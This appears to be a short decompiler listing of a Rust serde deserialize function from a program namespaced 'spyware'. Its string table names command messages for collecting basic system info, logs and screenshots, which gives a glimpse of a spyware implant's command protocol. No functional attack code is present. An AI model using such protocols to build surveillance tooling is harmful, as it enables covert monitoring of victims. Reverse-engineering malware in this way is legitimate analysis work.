long long spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::Architecture>::deserialize(unsigned long long a0, unsigned long long a1)
{
    a0.deserialize_enum(a1, "Architecturex86x86_64powerpcpowerpc64armaarch64PointerWidthBit32Bit64GetBasicInfoResponseversiontarget_osoperating_system_versionpointer_widthGetLogsRequestGetLogsResponseGetScreenshotRequestDisplayScreenshotbufferwidthheightGetScreenshotResponsedisplays_s", 12);
    return a0;
}
